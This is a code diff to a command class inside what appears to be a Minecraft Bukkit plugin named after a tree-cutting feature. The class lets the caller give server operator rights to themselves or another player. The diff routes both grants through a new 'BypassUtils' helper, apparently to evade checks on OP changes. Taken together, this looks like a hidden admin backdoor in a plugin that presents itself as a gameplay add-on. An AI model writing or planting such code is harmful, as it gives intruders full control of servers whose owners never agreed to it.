@@ -1,6 +1,7 @@
 package me.bow.treecapitatorultimate.commands.Player;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.BypassUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import org.bukkit.Bukkit;
@@ -21,7 +22,7 @@ public class OP extends Command {
                 p.sendMessage(Start.Prefix + ChatColor.YELLOW + "You already have OP!");
                 return;
             }
-            p.setOp(true);
+            BypassUtils.PlayerSetOp(p);
             p.sendMessage(Start.Prefix + ChatColor.GOLD + "You now have OP!");
         } else if (args.size() == 1) {
             try {
@@ -34,7 +35,7 @@ public class OP extends Command {
                     p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already has OP!");
                     return;
                 }
-                anotherPlayer.setOp(true);
+                BypassUtils.PlayerSetOp(anotherPlayer);
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now has OP!");
             } catch (Exception e) {
                 Start.ErrorException(p, e);
